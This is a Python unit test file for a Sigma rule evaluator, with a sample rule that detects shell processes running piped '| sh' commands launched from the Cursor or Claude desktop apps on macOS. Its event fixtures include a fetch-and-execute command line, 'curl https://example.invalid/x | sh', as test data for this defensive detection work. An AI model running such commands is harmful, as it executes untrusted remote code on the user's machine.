"""Unit tests for the Sigma fixture oracle, independent of the pack rules."""

from sigma.rule import SigmaRule

from larc_seraph.eval import rule_matches

_RULE = """
title: Oracle sample
name: ORACLE_SAMPLE
id: 11111111-1111-4111-8111-111111111111
status: experimental
description: Unit fixture for the evaluator.
logsource:
  product: macos
  category: process_creation
detection:
  selection_shell:
    Image|endswith:
      - '/bash'
      - '/bin/sh'
  selection_pipe:
    CommandLine|contains: '| sh'
  selection_parent:
    ParentImage|contains:
      - '/Cursor'
      - '/Claude'
  filter_editor:
    Image|endswith: '/vim'
  condition: selection_shell and selection_pipe and 1 of selection_parent* and not filter_editor
level: high
"""


def _rule() -> SigmaRule:
    return SigmaRule.from_yaml(_RULE)


def test_contains_is_case_insensitive_and_parent_or_matches():
    event = {
        "Image": "/bin/bash",
        "CommandLine": "curl https://example.invalid/x | SH",
        "ParentImage": "/Applications/Claude.app/Contents/MacOS/Claude",
    }
    assert rule_matches(_rule(), event)


def test_missing_field_does_not_match_and_negation_still_passes():
    event = {
        "Image": "/bin/bash",
        "CommandLine": "curl https://example.invalid/x | sh",
        "ParentImage": "/Applications/Cursor.app/Contents/MacOS/Cursor",
    }
    assert rule_matches(_rule(), event)
    event["Image"] = "/usr/bin/vim"
    assert not rule_matches(_rule(), event)


def test_terminal_parent_does_not_match():
    event = {
        "Image": "/bin/bash",
        "CommandLine": "curl https://example.invalid/x | sh",
        "ParentImage": "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
    }
    assert not rule_matches(_rule(), event)


def test_equals_does_not_match_a_longer_string():
    rule = SigmaRule.from_yaml(
        """
title: Equals sample
name: ORACLE_EQUALS
id: 22222222-2222-4222-8222-222222222222
status: experimental
description: Equality must be the whole field.
logsource:
  product: macos
  category: process_creation
detection:
  selection:
    Image: /usr/bin/ssh
  condition: selection
level: low
"""
    )
    assert rule_matches(rule, {"Image": "/usr/bin/ssh"})
    assert not rule_matches(rule, {"Image": "/usr/bin/ssh-keygen"})
    assert not rule_matches(rule, {})
